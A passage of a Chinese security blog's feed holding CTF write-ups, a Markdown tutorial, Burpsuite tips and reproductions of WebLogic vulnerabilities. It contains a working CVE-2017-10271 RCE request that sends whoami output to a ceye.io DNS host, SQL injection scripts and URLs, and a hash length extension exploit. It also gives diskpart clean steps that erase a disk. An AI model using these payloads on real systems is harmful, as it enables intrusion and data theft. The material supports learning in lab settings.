针对地址右击显示当前可以做的一些动作操作等功能。 选项二：Scope这个主要是配合Site map做一些过滤的功能 已请求在SiteMap中的项目会显示为黑色。尚未被请求的项目显示为灰色 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown基本用法]]></title>
    <url>%2F2018%2F02%2F08%2FMarkdown%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Markdown基本语法 Markdown是一种纯文本格式的标记语言。通过简单的标记语法，它可以使普通文本内容具有一定的格式。相比WYSIWYG编辑器 优点 1、因为是纯文本，所以只要支持Markdown的地方都能获得一样的编辑效果，可以让作者摆脱排版的困扰，专心写作。2、操作简单。比如:WYSIWYG编辑时标记个标题，先选中内容，再点击导航栏的标题按钮，选择几级标题。要三个步骤。而Markdown只需要在标题内容前加#即可 缺点 1、需要记一些语法（当然，是很简单。五分钟学会）。2、有些平台不支持Markdown编辑模式。还好，简书是支持Markdown编辑模式的。 1开启方式：设置-&gt;默认编辑器-&gt;Markdown编辑器 标题在想要设置为标题的文字前面加#来表示一个#是一级标题，二个#是二级标题，以此类推。支持六级标题。注：标准语法一般在#后跟个空格再写文字，貌似简书不加空格也行。 示例： 123456# 这是一级标题## 这是二级标题### 这是三级标题#### 这是四级标题##### 这是五级标题###### 这是六级标题 效果如下： 这是一级标题这是二级标题这是三级标题这是四级标题这是五级标题这是六级标题字体 这是加粗的文字 要加粗的文字左右分别用两个*号包起来 这是倾斜的文字 要倾斜的文字左右分别用一个*号包起来 斜体加粗 要倾斜和加粗的文字左右分别用三个*号包起来 删除线 要加删除线的文字左右分别用两个~~号包起来 示例： 1234**这是加粗的文字***这是倾斜的文字*`***这是斜体加粗的文字***~~这是加删除线的文字~~ 效果如下： 这是加粗的文字这是倾斜的文字这是斜体加粗的文字这是加删除线的文字 引用在引用的文字前加&gt;即可。引用也可以嵌套，如加两个&gt;&gt;三个&gt;&gt;&gt;n个…貌似可以一直加下去，但没神马卵用 示例： 123&gt;这是引用的内容&gt;&gt;这是引用的内容&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容 效果如下： 这是引用的内容 这是引用的内容 这是引用的内容 分割线三个或者三个以上的 - 或者 * 都可以。 示例： 1234-******** 效果如下： - 可以看到，显示效果是一样的。 图片语法： 1234![图片alt](图片地址 &apos;&apos;图片title&apos;&apos;)图片alt就是显示在图片下面的文字，相当于对图片内容的解释。图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加 示例： 12![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg &quot;区块链&quot;) 效果如下： 上传本地图片直接点击导航栏的图片标志，选择图片即可 超链接语法： 12[超链接名](超链接地址 &quot;超链接title&quot;)title可加可不加 示例： 12[简书](http://jianshu.com)[百度](http://baidu.com) 效果如下： 简书百度 注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。 1234&lt;a href=&quot;超链接地址&quot; target=&quot;_blank&quot;&gt;超链接名&lt;/a&gt;示例:&lt;a href=&quot;https://www.jianshu.com/u/1f5ac0cf6a8b&quot; target=&quot;_blank&quot;&gt;简书&lt;/a&gt; 列表 无序列表 语法：无序列表用 - + * 任何一种都可以 1234- 列表内容+ 列表内容* 列表内容注意：- + * 跟内容之间都要有一个空格 效果如下： 列表内容 列表内容 列表内容 有序列表 语法：数字加点 123451.列表内容2.列表内容3.列表内容注意：序号跟内容之间要有空格 效果如下： 1.列表内容2.列表内容3.列表内容 列表嵌套 上一级和下一级之间敲三个空格即可 一级无序列表内容 二级无序列表内容 二级无序列表内容 二级无序列表内容 一级无序列表内容 二级有序列表内容 二级有序列表内容 二级有序列表内容 一级有序列表内容 二级无序列表内容 二级无序列表内容 二级无序列表内容 2.一级有序列表内容 二级有序列表内容 二级有序列表内容 二级有序列表内容 表格语法： 1234567891011表头|表头|表头|:--:|:内容|内容|内容内容|内容|内容第二行分割表头和内容。- 有一个就行，为了对齐，多加了几个文字默认居左-两边加：表示文字居中-右边加：表示文字居右注：原生的语法两边都要用 | 包起来。此处省略 示例： 12345姓名|技能|排行--|:--:|--:刘备|哭|大哥关羽|打|二哥张飞|骂|三弟 效果如下： 姓名 技能 排行 刘备 哭 大哥 关羽 打 二哥 张飞 骂 三弟 语法： 单行代码：代码之间分别用一个反引号包起来 1`代码内容` 代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行 123代码...代码...代码... 流程图123456789flowst=&gt;start: 开始op=&gt;operation: My Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op&amp; 效果如下： 为文字添加背景色由于 style 标签和标签的 style 属性不被支持，所以这里只能是借助 table, tr, td 等表格标签的 bgcolor 属性来实现背景色。故这里对于文字背景色的设置，只是将那一整行看作一个表格，更改了那个格子的背景色（bgcolor） 1&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;背景色yellow&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 效果如下： 背景色yellow 更改字体、大小、颜色12345678&lt;font face=&quot;黑体&quot;&gt;我是黑体字&lt;/font&gt;&lt;font face=&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;;/font&gt;&lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt;&lt;font color=red&gt;我是红色&lt;/font&gt;&lt;font color=#008000&gt;我是绿色&lt;/font&gt;&lt;font color=Blue&gt;我是蓝色&lt;/font&gt;&lt;font size=5&gt;我是尺寸&lt;/font&gt;&lt;font face=&quot;黑体&quot; color=green size=5&gt;我是黑体，绿色，尺寸为5&lt;/font&gt; 效果如下： 我是黑体字我是微软雅黑&lt;;/font&gt;我是华文彩云我是红色我是绿色我是蓝色我是尺寸我是黑体，绿色，尺寸为5 介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Firefox渗透插件—Web渗透必备工具]]></title>
    <url>%2F2018%2F02%2F04%2FFirefox%E6%B8%97%E9%80%8F%E6%8F%92%E4%BB%B6%E2%80%94Web%E6%B8%97%E9%80%8F%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[工欲善必先利其器，firefox一直是各位渗透师必备的利器，我这里推荐34款firefox渗透测试辅助插件，其中包含渗透测试、信息收集、代理、加密解密等功能。 1： Firebug Firefox的 五星级强力推荐插件之一，不许要多解释 2： User Agent Switcher 改变客户端的User Agent的一款插件 3： Hackbar 攻城师们的必备工具，提供了SQL注入和XSS攻击，能够快速对字符串进行各种编码。 4： HttpFox 监测和分析浏览器与web服务器之间的HTTP流量 5： Live HTTP Headers 即时查看一个网站的HTTP头 6： Tamper Data 查看和修改HTTP/HTTPS头和POST参数 7： ShowIP 在状态栏显示当前页的IP地址、主机名、ISP、国家和城市等信息。 8： OSVDB 开放源码的漏洞数据库检索 9: Packet Storm search plugin Packet Storm提供的插件，可以搜索漏洞、工具和exploits等。 10： Offsec Exploit-db Search 搜索Exploit-db信息 11： Security Focus Vulnerabilities Search Plugin 在Security Focus上搜索漏洞 12： Cookie Watcher 在状态栏显示cookie 13: Header Spy 在状态栏显示HTTP头 14： Groundspeed Manipulate the application user interface. 15： CipherFox 在状态栏显示当前SSL/TLS的加密算法和证书 16： XSS Me XSS测试扩展 17： SQL Inject Me SQL注入测试扩展 18： Wappalyzer 查看网站使用的应用程序 19： Poster 发送与Web服务器交互的HTTP请求，并查看输出结果 20： Javascript Deobfuscator 显示网页上运行的Javascript代码 21： Modify Headers 修改HTTP请求头 22： FoxyProxy 代理工具 23： FlagFox 可以在地址栏或状态栏上显示出当前网站所在国家的国旗，也有更多的其他功能，如：双击国旗可以实现WOT功能；鼠标中键点击是whois功能。当然用户可以在选项里设置快捷键实现诸如复制IP，维基百科查询等功能。 24： Greasemonkey greasemonkey 使你可以向任何网页添加DHTML语句(用户脚本)来改变它们的显示方式。就像CSS可以让你接管网页的样式，而用户脚本(User Script)则可以让你轻易地控制网页设计与交互的任何方面。例如: 使页面上显示的 URL 都成为可以直接点击进入的链接。 增强网页实用性，使你经常访问的网站更符合你的习惯。 绕过网站上经常出现的那些烦人的 Bug。 25： Domain Details 显示服务器类型、IP地址、域名注册信息等 26： Websecurify Websecurify是WEB安全检测软件的Firefox的扩展，可以针对Web应用进行安全评估 27： XSSed Search 搜索XSSed.Com跨站脚本数据库 28： ViewStatePeeker 查看asp.net的iewState 29： CryptoFox 破解MD5、加密/解密工具 30： WorldIP 显示服务器的IP、地址、PING、Traceroute、RDNS等信息 31： Server Spy 识别访问的web服务器类型，版本以及IP地址的插件 32： Default Passwords 搜索CIRT.net默认密码数据库。 33： Snort IDS Rule Search 搜索Snort的IDS规则，做签名开发的应该很有用。 34： FireCAT FireCAT (Firefox Catalog of Auditing exTensions) 是一个收集最有效最有用的应用程序安全审计和风险评估工具的列表(这些工具以Firefox插件形式发布的),FireCAT中没有收集的安全工具类型包 括:fuzzer,代理和应用程序扫描器. 原文转自：http://www.91ri.org/4441.html]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Firefox渗透插件</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebLogic XMLDecoder反序列化漏洞复现]]></title>
    <url>%2F2018%2F02%2F03%2FWebLogic%20XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[CVE-2017-10271 Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。 影响范围 Oracle WebLogic Server 10.3.6.0.0版本 Oracle WebLogic Server 12.1.3.0.0版本 Oracle WebLogic Server 12.2.1.1.0版本 测试环境搭建docker搭建1https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf 编译及启动测试环境12docker-compose builddocker-compose up -d 访问 http://127.0.0.1:7001/wls-wsat/CoordinatorPortType 存在该漏洞组件 用burpsuite抓包访问 改包： 12345678910111213141516171819202122232425262728293031POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.30.146:7001User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv:11.0) like GeckoAccept: */*Content-Type: text/xmlAccept-Language: zh-cnConnection: closeContent-Length: 646&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt; &lt;void class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt;&lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt;&lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt;&lt;string&gt;ping `whoami`.ip.port.eu04a0.ceye.io&lt;/string&gt; &lt;/void&gt;&lt;/array&gt; &lt;void method="start"/&gt;&lt;/void&gt;&lt;/java&gt; &lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 查看ceye平台的DNS查询记录，发现服务器成功执行whoami命令并将结果拼接到ping命令中执行，用户名成功返回到DNS查询记录中： ps: 使用ceye平台查看DNS查询记录网站地址：1http://ceye.io/profile]]></content>
      <categories>
        <category>漏洞学习</category>
        <category>Weblogic</category>
      </categories>
      <tags>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[weblogic ssrf 漏洞复现]]></title>
    <url>%2F2018%2F02%2F02%2Fweblogic%20ssrf%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 测试环境搭建docker搭建1https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf 编译及启动测试环境12docker-compose builddocker-compose up -d 访问 http://your-ip:7001/uddiexplorer/，无需登录即可查看 uddiexplorer 应用。 SSRF漏洞测试SSRF漏洞存在于 http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在 brupsuite 下测试该漏洞。访问一个可以访问的 IP:PORT，如 http://127.0.0.1:80 访问：1http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 修改为一个不存在的端口，将会返回could not connect over HTTP to server。 1http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 通过错误的不同，即可探测内网状态。]]></content>
      <categories>
        <category>漏洞学习</category>
        <category>Weblogic</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西普实验吧-web]]></title>
    <url>%2F2018%2F02%2F01%2F%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-web%2F</url>
    <content type="text"><![CDATA[西普实验吧-web题目学习 看起来有点难 用sqlmap跑一下 用户密码跑出来就行了。 猫抓老鼠 提交即可。 Forbidden 总结：zh-CNzh-hk 小写en-gb.NET CLR 9.9IEx-forwarded-for:1.1.1.1 头有点大 貌似有点难 这个看起来有点简单! 普通的数字型显错注入 PHP大法 12345678910111213141516&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125;?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? hackerDJ 经过两次urlencode即可 what a fuck!这是什么鬼东西? 直接复制到浏览器的console运行即可 程序逻辑问题 1234567891011121314151617181920212223242526272829303132&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect("********, "*****", "********"); mysql_select_db("phpformysql") or die("Could not select database"); if ($conn-&gt;connect_error) &#123; die("Connection failed: " . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = "select pw from php where user='$user'";$query = mysql_query($sql);if (!$query) &#123; printf("Error: %s\n", mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row["pw"]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo "&lt;p&gt;Logged in! Key:************** &lt;/p&gt;";&#125;else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125;$sql = "select pw from php where user='$user'"; 直接用户写 ‘union select md5(1)# 密码写 1 即可绕过 1select pw from php where user='' union select md5(1)# NSCTF web200 写个逆运算即可 python脚本如下：1234a="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws".encode('rot13')[::-1].decode('base64')print "".join([chr(ord(i)-1) for i in a])[::-1] 上传绕过 通过%00截断 FALSE 123456789101112&lt;?phpif (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else&#123; echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt; md5弱类型 Guess Next Session 1234567891011&lt;?phpsession_start(); if (isset ($_GET['password'])) &#123; if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); else print '&lt;p&gt;Wrong guess.&lt;/p&gt;';&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 清空cookie，password也为空 Once More 1234567891011121314151617181920212223&lt;?phpif (isset ($_GET['password'])) &#123; if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123; if (strpos ($_GET['password'], '*-*') !== FALSE) &#123; die('Flag: ' . $flag); &#125; else &#123; echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); &#125; &#125; else &#123; echo '&lt;p&gt;Invalid password&lt;/p&gt;'; &#125;&#125;?&gt; 忘记密码了 查看源代码发现 因为是vim 考虑源码泄露 尝试 .submit.php.swp 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "失败了呀"; &#125;&#125; token要等于0而且长度要等于10 0000000000 天网管理系统 输入username=QNKCDZO 123456$unserialize_str = $_POST['password']; $data_unserialize = unserialize($unserialize_str); if($data_unserialize['user'] == '???' &amp;&amp; $data_unserialize['pass']=='???') &#123; print_r($flag); &#125; 伟大的科学家php方言道：成也布尔，败也布尔。回去吧骚年 分析： 代码意思是把post提交的password值经过”反序列化”得到一个数组，要求数组里的user和pass都等于某个值时就打印flag。 但是我们不知道两处???到底是什么，因此无法考虑用php函数构造这样的值。 别忘了还有一个提示： “伟大的科学家php方言道：成也布尔，败也布尔” ，bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度） 构造password值为：1a:2:&#123;s:4:"user";b:1;s:4:"pass";b:1;&#125; 在密码栏中提交构造的值，即可获取flag: ctf{dwduwkhduw5465} Forms 拐弯抹角 应该是题目出了问题，直接访问index.php得到flag 让我进去 源代码：12345678910111213141516171819202122232425262728293031$flag = "XXXXXXXXXXXXXXXXXXXXXXX";$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!$username = $_POST["username"];$password = $_POST["password"];if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123; if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125;setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE["source"])) &#123; setcookie("source", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE["source"] != 0) &#123; echo ""; // This source code is outputted here &#125;&#125; hash长度扩展攻击代码：123456789101112131415161718192021222324252627282930313233'''samplehash='571580b26c65f306376d4f64e53cb5c7's1='0x'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]s2='0x'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]s3='0x'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]s4='0x'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]print s1,'\n',s2,'\n',s3,'\n',s4'''#!/usr/bin/env python# -*- coding: utf-8 -*-# @Author：DshtAngerimport my_md5#reference:# http://www.freebuf.com/articles/web/69264.html#problem link:# http://ctf4.shiyanbar.com/web/kzhan.phpsamplehash="571580b26c65f306376d4f64e53cb5c7"#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书s1=0xb2801557s2=0x06f3656cs3=0x644f6d37s4=0xc7b53ce5print type(s1)#expsecret = "a"*15secret_admin = secret+'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'r = my_md5.deal_rawInputMsg(secret_admin)inp = r[len(r)/2:]print "getmein:"+my_md5.run_md5(s1,s2,s3,s4,inp)得到：getmein:e18dfd8404515016d3aeeea2aa196909 burp抓包改包username=adminpassword=admin+\x80\x00……admin\x80\x00要在hex里面修改 或者用username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin 天下武功唯快不破 python 代码如下：123456789import requests,refrom base64 import b64decodes = requests.Session()url = 'http://ctf5.shiyanbar.com/web/10/10.php'r = s.get(url)head = r.headersflag = b64decode(head['flag']).split(':')[1]r1 = s.post(url, data=&#123;'key':flag&#125;)print r1.text 简单的sql注入 双写绕过加上空格过滤 简单的sql注入之2 简单的sql注入之3 http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39; and exp(~(select * FROM(SELECT database())a))–+ http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39; and exp(~(select * FROM(select group_concat(table_name) from information_schema.tables where table_schema=’web1’)a))–+ http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39; and exp(~(select * FROM(select group_concat(column_name) from information_schema.columns where table_name=’flag’ )a))–+ http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39; and exp(~(select * FROM(select flag from flag)a))–+ 因缺思汀的绕过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) &#123; echo '&lt;form action="" method="post"&gt;'."&lt;br/&gt;"; echo '&lt;input name="uname" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input name="pwd" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input type="submit" /&gt;'."&lt;br/&gt;"; echo '&lt;/form&gt;'."&lt;br/&gt;"; echo '&lt;!--source: source.txt--&gt;'."&lt;br/&gt;"; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match("/".$ArrReq."/is",$StrValue)==1)&#123; print "水可载舟，亦可赛艇！"; exit(); &#125;&#125;$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db="XXXXXX";mysql_select_db($db, $con);$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print "CTF&#123;XXXXXX&#125;"; &#125;else&#123; print "亦可赛艇！"; &#125;&#125;else&#123; print "一颗赛艇！";&#125;mysql_close($con);?&gt; 这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的 那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #这里解释一下此时执行的SQL:SELECT * FROM interest where uname=’ ‘ or 1=1group by pwd with rollup （在数据库中添加一行使得pwd=NULL）limit 1 （只查询一行）offset 2 （从第二行开始查询） #注释此时密码只要为空即可查询成功 who are you? 发现逗号之后内容的都截断了 尝试xff注入12345678910111213141516import requestsimport stringurl="http://ctf5.shiyanbar.com/web/wonderkun/index.php"allString=string.lowercase + string.uppercase + string.digitsflag=""for i in range(1,33): for str1 in allString: data="11'+(select case when (substring((select flag from flag ) from &#123;0&#125; for 1 )='&#123;1&#125;') then sleep(4) else 1 end ) and '1'='1".format(str(i),str1) headers=&#123;"x-forwarded-for":data&#125; try: res=requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout, e: flag += str1 print flag breakprint 'flag:' + flag 即可跑出 登陆一下好吗?? 12345$sql = “select user from flag where user=’\$_POST[‘user’]’ and password=’\$_POST[‘password’]’”;输入username= '=' password= '='$sql = “select user from flag where user=''='' and password=''='' user=”返回的是NULL=”也是符合条件的，最后就是$sql = “select user from flag where 1 and 1”;]]></content>
      <categories>
        <category>CTF</category>
        <category>实验吧</category>
      </categories>
      <tags>
        <tag>实验吧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Burpsuite 中文乱码]]></title>
    <url>%2F2018%2F02%2F01%2FBurpsuite-%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%2F</url>
    <content type="text"><![CDATA[在做测试的时候总是遇到response中文乱码的问题。Google很多解决方案都是仅仅只修改burp字体。可是有些时候单纯修改字体问题依然会存在。后来发现还需要设置burp编码，目前问题暂时得到解决，以下记录问题过程及解决详情，供有需之人。 burpsuite response返回中文乱码，像下面这样： 解决方法设置User options——Display——HTTP Message Display的Font为中文字体，比如宋体、微软雅黑等。然后设置Character Sets为Use a specific character set:UTF-8(这里吐槽下，windows默认选择的是Recognize automatically based on message headers，Mac则默认就是UTF-8，当时没发现这点，一直以为是字体原因 =.=！)具体可见下图： 解决后的效果如下图： Happy，burpsuite中文乱码问题解决。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西普实验吧-密码学]]></title>
    <url>%2F2018%2F01%2F30%2F%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AF%86%E7%A0%81%E5%AD%A6%2F</url>
    <content type="text"><![CDATA[西普实验吧-密码学题目学习 这里没有key chinese hacker ubuntu系统，所以安装了一下mdbtoolssudo apt-get install mdbtools mdbtools-gmdb mdbtools-dev 并不是base64加密，是base32解密即可 压缩的问题 用该段代码作为解压密码即可。 一段奇怪的代码 最近在论证一个问题，到底是先有鸡还是先有蛋 电脑键盘解密– key 最近听说刘翔离婚了 摩擦摩擦 摩斯密码解密 凯撒是罗马共和国杰出的军事统帅 凯撒解密 古典密码的安全性不高，但仍然十分美妙，请破译下面的密文 数码管 一个img文件太麻烦不想弄 keyboard BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN提示键盘了，按照给出的字母顺序在键盘上画出字母的形状，就是答案 密文 rot13 先rot13再md5]]></content>
      <categories>
        <category>CTF</category>
        <category>实验吧</category>
      </categories>
      <tags>
        <tag>实验吧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磁盘分区恢复]]></title>
    <url>%2F2017%2F12%2F29%2F%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%81%A2%E5%A4%8D%2F</url>
    <content type="text"><![CDATA[利用window自带的cmd命令恢复磁盘分区 按windows键，右键点击运行，再左键点击以管理员身份运行输入diskpart,按enter 输入list disk,按enter 输入select disk X(X代表磁盘后面的数字0、1，可磁盘的大小来判断数字是多少)按enter选择后输入clean 搞定。]]></content>
      <categories>
        <category>经验分享</category>
        <category>磁盘</category>
      </categories>
      <tags>
        <tag>磁盘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速抓取网页内容]]></title>
    <url>%2F2017%2F12%2F28%2F%E5%BF%AB%E9%80%9F%E6%8A%93%E5%8F%96%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[python 快速抓取网页内容 两道例题题目1 python 代码：12345678910import requests,refrom base64 import b64decodes = requests.Session()url = 'http://120.24.86.145:8002/web6/'r = s.get(url)head = r.headersflag = b64decode(head['flag']).split(':')[1]flag = b64decode(‘flag’)r1 = s.post(url, data=&#123;'margin':flag&#125;)print r1.text 题目2 python 代码：123456789import requests,refrom base64 import b64decodes = requests.Session()url = 'http://ctf5.shiyanbar.com/web/10/10.php'r = s.get(url)head = r.headersflag = b64decode(head['flag']).split(':')[1]r1 = s.post(url, data=&#123;'key':flag&#125;)print r1.text]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[序列化漏洞]]></title>
